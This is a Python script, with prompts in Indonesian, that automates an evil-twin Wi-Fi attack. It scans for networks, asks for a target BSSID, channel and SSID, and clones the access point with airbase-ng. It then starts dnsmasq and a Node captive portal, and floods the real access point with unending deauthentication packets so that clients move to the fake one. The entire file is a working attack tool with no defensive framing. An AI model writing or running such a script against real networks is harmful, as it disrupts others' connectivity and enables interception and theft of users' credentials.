import os
import subprocess
import time

def run_cmd(cmd):
    subprocess.Popen(cmd, shell=True)


def main():
    os.system(f"sudo airmon-ng start wlan0")
    print("[+] Tekan Ctrl+C untuk berhenti scan dan pilih target")
    try:
        os.system(f"sudo airodump-ng wlan0mon")
    except KeyboardInterrupt:
        pass

    bssid = input("Masukkan BSSID target: ")
    channel = input("Masukkan channel target: ")
    ssid = input("Masukan SSID target: ")

    print("[+] Membuat fake AP...")
    run_cmd(f"sudo airbase-ng -e '{ssid}' -c {channel} wlan0mon")
    time.sleep(10)

    print("[+] Menjalankan dnsmasq...")
    run_cmd("sudo systemctl stop systemd-resolved")
    time.sleep(10)
    run_cmd("sudo systemctl disable systemd-resolved")
    time.sleep(10)
    run_cmd("sudo ifconfig at0 192.168.10.1 netmask 255.255.255.0 up")
    time.sleep(10)
    run_cmd("sudo dnsmasq -C dnsmasq.conf -d")
    time.sleep(10)

    print("[+] Menjalankan captive portal...")
    run_cmd("sudo NODE_ENV=production node server.js")
    time.sleep(10)

    print("[+] Menjalankan deauth attack...")
    run_cmd(f"sudo aireplay-ng --deauth 0 -a {bssid} wlan0mon")
    time.sleep(10)
    print("[+] Semua service berjalan. Tekan Ctrl+C untuk berhenti.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Dihentikan oleh user.")
        run_cmd("sudo airmon-ng stop wlan0mon")
        time.sleep(10)
        run_cmd("sudo systemctl restart systemd-resolved")

if __name__ == "__main__":
    main()
